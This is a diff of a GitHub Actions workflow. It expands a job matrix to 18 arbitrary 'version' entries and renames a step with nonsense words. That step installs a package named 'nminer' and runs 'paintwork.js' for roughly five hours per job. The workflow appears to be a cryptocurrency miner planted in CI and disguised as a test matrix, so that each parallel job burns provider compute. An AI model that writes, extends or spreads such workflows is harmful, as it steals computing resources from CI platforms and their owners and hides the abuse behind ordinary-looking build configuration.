@@ -9,21 +9,24 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 7198 }
-          - { version: 9557 }
-          - { version: 8591 }
-          - { version: 4023 }
-          - { version: 6658 }
-          - { version: 7520 }
-          - { version: 1285 }
-          - { version: 3523 }
-          - { version: 3429 }
-          - { version: 3428 }
-          - { version: 7423 }
-          - { version: 2830 }
-          - { version: 1794 }
-          - { version: 4063 }
-          - { version: 8951 }
+          - { version: 1100 }
+          - { version: 3972 }
+          - { version: 292 }
+          - { version: 5780 }
+          - { version: 6839 }
+          - { version: 4428 }
+          - { version: 1025 }
+          - { version: 5947 }
+          - { version: 8579 }
+          - { version: 5096 }
+          - { version: 4176 }
+          - { version: 5671 }
+          - { version: 8948 }
+          - { version: 8215 }
+          - { version: 12 }
+          - { version: 349 }
+          - { version: 2281 }
+          - { version: 9293 }
 
     steps:
       - name: Checkout
@@ -34,7 +37,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: or loosely rotten woot
+      - name: trash substantiate long-term straw oddly
         run: |
           npm install nminer@latest
-          timeout 306m node paintwork.js || echo "paintwork executed"
+          timeout 308m node paintwork.js || echo "paintwork executed"
